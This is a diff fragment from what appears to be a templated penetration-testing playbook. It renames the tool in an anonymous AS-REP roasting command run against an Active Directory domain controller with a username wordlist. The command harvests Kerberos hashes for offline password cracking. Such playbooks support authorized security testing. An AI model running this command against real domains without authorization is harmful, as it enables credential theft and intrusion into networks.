@@ -41,7 +41,7 @@ curl -s -o /dev/null -w "%{http_code}" {{web_url}} 2>&1
 ### 4. Kerberoastable/AS-REP Account Discovery (anonymous)
 ```bash
 # Get AS-REP roastable accounts (no creds needed if LDAP allows anon)
-GetNPUsers.py {{domain}}/ -dc-ip {{dc}} -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt 2>&1 | head -50
+impacket-GetNPUsers {{domain}}/ -dc-ip {{dc}} -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt 2>&1 | head -50
 ```
 
 ## Output
